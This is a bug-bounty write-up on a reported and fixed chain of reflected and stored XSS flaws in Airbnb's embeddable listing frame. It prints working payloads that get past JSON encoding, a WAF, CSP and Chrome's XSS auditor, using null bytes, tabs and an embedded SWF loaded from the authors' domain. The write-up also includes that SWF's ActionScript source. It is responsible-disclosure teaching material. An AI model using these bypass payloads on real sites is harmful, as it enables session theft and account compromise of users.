---
source: zlz-buerhaus
source_url: https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/
title: "Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities | ziot"
---

[< Back](https://buer.haus/)

![airbnb_horizontal_lockup_print](https://buer.haus/wp-content/uploads/2016/05/airbnb_horizontal_lockup_print.jpg)

Authors:

- [![image](https://abs.twimg.com/errors/logo23x19.png) Ben Sadeghipour](https://twitter.com/nahamsec)
- [![image](https://abs.twimg.com/errors/logo23x19.png) Brett Buerhaus](https://twitter.com/bbuerhaus)

We recently started participating in Airbnb's bounty program on [HackerOne](https://hackerone.com/airbnb). We heard a lot about this company in the past but had never used their service before. Overall they have a pretty solid website, but we were still able to discover a handful of issues. There is one vulnerability that we wanted to write about because of the level of protection in front of it. The goal of this write-up is to show others that sometimes it takes a little bit of creativity to discover potential flaws and fully exploit them.

The vulnerability we discovered is a series of Cross-Site Scripting attacks that involved bypassing JSON encoding, an XSS filter, a pretty decent WAF, CSP rules, and eventually getting it to bypass Chrome's XSS auditor.

Alright, diving in from the initial discovery:

**1) Using a semi-colon to bypass the initial XSS filter stripping.**

This may not seem special, but it was an important discovery. Using a semi-colon in user input that is placed inside of <script></script> with JSON encoding would bypass a critical part of the XSS filter. As long as you placed a ; before your payload, it would prevent the XSS-filter from stripping your initial injection.

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=<u>test123

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"test123","controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;<u>test123

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"","<u>test123":null,"controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

As you can see, the <u> gets stripped from the source without a semi-colon. At this point we know that we can use an unencoded </script> to get outside of the <script></script> tag. It's not demonstrated yet, but the user-input is JSON encoded so we can't use quotes to get script execution due to it being escaped.

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;</script><u>test123

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"","</script><u>test123":null,"controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

**2) Using null-bytes to bypass part of the WAF protection and it still working due to application stripping them out.**

URL:

https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;</script><script>alert(1)</script>;

Result:

![waf](https://buer.haus/wp-content/uploads/2016/05/waf-1.png)

After a little bit of messing around with this, we came to the conclusion that there's a Web Application Firewall (WAF) protecting the endpoint from common web attacks. I'm not going to dive too deeply into the amount of things tested, but understand that when you are put up against a WAF that it's all trial and error. You put in a few possible payloads and go a few characters at a time until you understand what is causing the WAF to kill the request. Eventually we came to this:

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;<sc%00ript>alert/\*\*/(1)</script>

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"","<sc\u0000ript>alert/**/(1)</script>":null,"controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

There's a few things to note from this:

- You can use a null-byte to bypass the WAF. This is demonstrated in splitting the word script into sc%00ript. Downside? It resulted in sc\\u0000ript in the request body which is invalid.
- While getting to that endpoint, we discovered that no matter what we tested it was impossible to get <script> on the page. There were a few elements we could use, but iframe and script are ruled out after a bit of testing and not finding a way to trick the WAF when it came to these two strings. Even with null-bytes, it resulted in broken elements
- This WAF is pretty decent, but a simple attack vector was able to bypass the alert check: alert/\*\*/(1)//. This is a good discovery going forward for testing, but it also acts as a confidence boost that the WAF can be defeated.

Going beyond elements, we were curious to see what happens when we added an attribute. Of course, src="" is triggering the waf and adding a null-byte on it would add the \\u0000 to it like we saw before. After a bit of messing with it, adding a random junk attribute shows that JSON encoding is messing with our payload.

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;<sc%00ript/test='asdf'>alert/\*\*/(1)</script>

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"","<sc\u0000ript/test":"'asdf'>alert/**/(1)","controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

If you look at the source, you can see that the equal (=) got converted into a colon (:). This is a hint that our input is being encoded, so the next step required is to break it. Without breaking the encoding, we are going to have a very very tough time getting a working payload especially when factoring in additional security layers such as CSP and browser XSS auditor.

Fast-forward a bit and we landed on this URL:

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/\*\*/(1)</script>

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"","<sc\u0000ript/test":"'asdf'/test2='asdf'>alert/**/(1)","controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

Now we have null-bytes that can be used to bypass the WAF and get stripped from the request body. You might be asking... how? why? What was the process going from one URL to the next. The answer is honestly just trial and error. You have to try as many things as possible and see what sticks. There are two things worth noting on this endpoint:

- The first attribute we include in our payload is a throwaway. Once it converts the first equal into a colon, our equals after will stop getting converted. This is probably cause the encoder now thinks we're part of the JSON value.
- Null-bytes are being sent with the request but they are getting stripped out of the JSON value once the encoder sees it.

Putting this together, we can try to execute a payload and see what happens. We had already looked ahead and knew CSP rules would prevent it, but this is just to demonstrate what would happen if you tried:

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;</script><img/test='asdf'/sr%00c=''/on%00error=prompt>

![csp](https://buer.haus/wp-content/uploads/2016/05/csp-1.png)

So although we have an injected <img> tag with a valid onerror executing JavaScript code, the CSP rules tell the browser to not execute the inline script.

**3) Bypassing Content-Security Policy (CSP) to get script execution.**

If you load the listing\_frame endpoint and look at the request response, you'll see that airbnb has Content-Security Policy enabled. A very basic description of CSP is that it determines where you can load content from and where you can execute script from. The first step is to view what the CSP rules are to figure out if there are any weaknesses.

New to CSP? Recommended reading:

- High-level view: [http://content-security-policy.com/](http://content-security-policy.com/)
- Spec: [https://www.w3.org/TR/CSP/](https://www.w3.org/TR/CSP/)

![csp](https://buer.haus/wp-content/uploads/2016/05/csp.png)

```
default-src 'self' https:; connect-src 'self' https: http:; font-src 'self' https:; frame-src *; img-src
 'self' https: http: data:; media-src 'self' https:; object-src 'self' https:; script-src 'sha256-q590j1fW
+aERb666H10h55ePy0sxRjUYCiOmJPftXDs=' 'self' https: 'unsafe-eval' 'unsafe-inline' http:; style-src 'self'
 https: 'unsafe-inline' http:; report-uri /tracking/csp?action=listing_frame&controller=embed&req_uuid
=cff37d5d-4c12-4c8b-b288-1ce0d103a25c&version=c7fc601874a5350c79eceb33ba6d4c09a433035f;
```

Here are some observations on the CSP rules:

- default-src is set to 'self' which means it's setting all CSP rules to only allow src attribute from a same-origin. In short, you should only be able to load src from a relative endpoint.
- frame-src is set to wildcard (\*) so we can load external src links in frames (iframe, frame, frameset). Because we're injecting HTML past the body element, we cannot use frame or frameset. The WAF has made it next to impossible to use iframe.
- script-src has 'self' supplied after the sha256 hashed script for unsafe-inline and unsafe-eval, but https does not have 'self' supplied meaning we can load external scripts for execution.

We have a few options with this ruleset but there are two that standout:

1. We can try to find a JSONP callback that lets us use special characters and include it as a relative path (same origin) script.
2. We find an element that lets us load an external script for execution that does not involve iframe or script

**4) The Initial Payloads.**

JSONP Callback

On the first point, we did some Google searches and found that there are a few documented API calls that have JSONP callbacks on the www Airbnb domain. These callbacks are subjected to the WAF but they allow most special characters which means we can use it.

![callback](https://buer.haus/wp-content/uploads/2016/05/callback.png)

The downside of this is that we'd need to solve a problem with the WAF bypass of getting a working injected <script>. Because we already tested this for a bit, the better solution was to see about SWFs.

Embeddable SWF

We quickly realized that <embed> was not being blocked by the WAF and that we could use null-bytes on the src attribute. With the CSP rules and the WAF bypass, we should be able to get JavaScript execution using this method.

URL: https://www.airbnb.com/embeddable/listing\_frame?id=9978655&city-link-index=;</script><embed/test='asdf'/sr%00c='/'>

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","id":"9978655","city-link-index":"","</script><embed/test":"'asdf'/src='/'>","controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

Most XSS SWF files have GET request variables to supply a JavaScript payload. We quickly realized that the WAF was blocking all attempts at including request variables in the embed src URL. It must have some sort of detection of URLs inside of GET request vars. We had to put together a SWF file with the XSS payload built inside of it to bypass this detection.

Here's the actionscript we decided to use for this attack.

```
package
{
    import flash.display.Sprite;
    import flash.external.*;
    import flash.system.System;
    public class XSSProject extends Sprite
    {
        public function XSSProject()
        {
            flash.system.Security.allowDomain("*");
            ExternalInterface.marshallExceptions = true;
            try {
                ExternalInterface.call("0);}catch(e){};alert(document.domain);//");
            } catch(e:Error) {
                trace(e);
            }
        }
    }
}
```

It's a slightly modified version of Sorough Dalili's (@irsdl) flash XSS SWF on his website: [https://soroush.secproject.com/blog/2012/11/xss-by-uploadingincluding-a-swf-file/](https://soroush.secproject.com/blog/2012/11/xss-by-uploadingincluding-a-swf-file/)

The payload:

URL: https://www.airbnb.com/embeddable/listing\_frame?city-link-index=;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//buer.haus/xss2.swf'//>&id=9978655

Source:

```
"is_render_for_embed":true,"embed_data_for_logging":{"external_page_uri":"/","city-link-index":"","</script><embed/test":"''/allowscriptaccess='always'/src='//buer.haus/xss2.swf'//>","id":"9978655","controller":"embed","action":"listing_frame"},"trebuchets":{}}--></script>
```

![xss1](https://buer.haus/wp-content/uploads/2016/05/xss1.png)

Success?!

Nope, of course not. That would be too easy. Although the XSS payload was executing for one person, it wasn't for anyone else. We deduced that the WAF was using some sort of fingerprinting of both IP and browser headers such as User-Agent. Even though it worked on one IP/computer, it would not work on the same IP with a different User Agent or browser. For some people it would redirect to the base domain and for others it would simply throw the generic WAF error.

What options do we have here? On one hand, we know that it fingerprinted our history of requests. If we bombard a browser with the thousands of requests we sent to get to this point it may work. Practical? Not really. So the only other option is to go back to the drawing board and start manipulating the payload until it works for everyone.

Abusing some of the tricks we've already discovered, we can butcher the payload enough that the WAF no longer treats it as a threat:

URL:

```
https://www.airbnb.co.uk/embeddable/listing_frame?</script><embed%20/test=''/+allowscript%00acces%00s='al%00ways'+sr%00c='//buer.haus/xss2.swf'>&city-link-index=&id=9978655'+on%00error=al%00ert%00(1)
'&action
```

Are we finished? Nope, lol. This payload works for Firefox but it gets blocked in Chrome because of XSS auditor.

**5) The Universal Payload**

Using the same tricks we used to confuse the WAF, we were able to defeat the auditor. This involved abusing the null-byte attack and using tabs. The final payload that works in Firefox, Chrome, Safari and bypasses all layers of protections:

```
https://www.airbnb.co.uk/embeddable/listing_frame?</script><em;<;>;<embed /test=''/+allowscript%00acces%00s='al%00%09ways'+%09%00s%09r%00c='//buer.haus/xss2.swf'><em;&city-link-index=&id=9978655'+on%00error=al%00ert%00(1)'&action
```

![final xss](https://buer.haus/wp-content/uploads/2016/05/final-xss.png)

**6) Unleashing the Kraken**

When you have an XSS filter, you are generally relying on it universally. Although this exploit only works against JSON encoded input, Airbnb is using JSON data heavily across their entire website. Now that we have a working payload, we started to hit the rest of the website. After a short bit of exploring, we discovered 7 additional vulnerable locations including a Stored Cross-Site Scripting issue instead of just Reflected.

Stored!

[![stored](https://buer.haus/wp-content/uploads/2016/05/stored-300x120.png)](https://buer.haus/wp-content/uploads/2016/05/stored.png)

and more!

[![reflected2](https://buer.haus/wp-content/uploads/2016/05/reflected2-300x244.png)](https://buer.haus/wp-content/uploads/2016/05/reflected2.png)

**Takeaways**

Every time we find a vulnerability we try to put together a couple of takeaways from it. What did we learn that we can reuse later? What did we do right? What did we do wrong? How could the company have prevented this from happening? There's a lot to learn from every vulnerability that you discover and report.

- XSS filtering is a gamble - we think the security machine has proven time and time again that it's not a good enough solution. Some companies have filters that may be close to perfect, but we doubt they will last. Consider this: people are using browser features implemented a year ago to exploit filters built 2-3+ years ago. Developers simply cannot write code that predicts the future of browser security.
- Perseverance. Hit something constantly until you fully understand what is happening. If you can't, save it to a notepad and come back to it at a later date. There's a lot of bounty reports that are discoveries from a year prior but were not fully exploitable until a year later. It can be a mix of just learning more over the span of a year or having a moment of eureka.
- WAFs are great, but they aren't perfect. With that said, the WAF on Airbnb was actually pretty solid. Also, as a developer you need to be careful striping garbage from a request because it can be a quick way for an attacker to circumvent WAFs and browser XSS detection.

**Thanks**

- [Ibrahim Mosaad (the\_storm)](https://twitter.com/ibrahim_mosaad) for ideas on how to bypass browser auditor.

**Timeline**

- Discovered: 5/8/2016
- Reported: 5/9/2016
- Fixed: 5/20/2016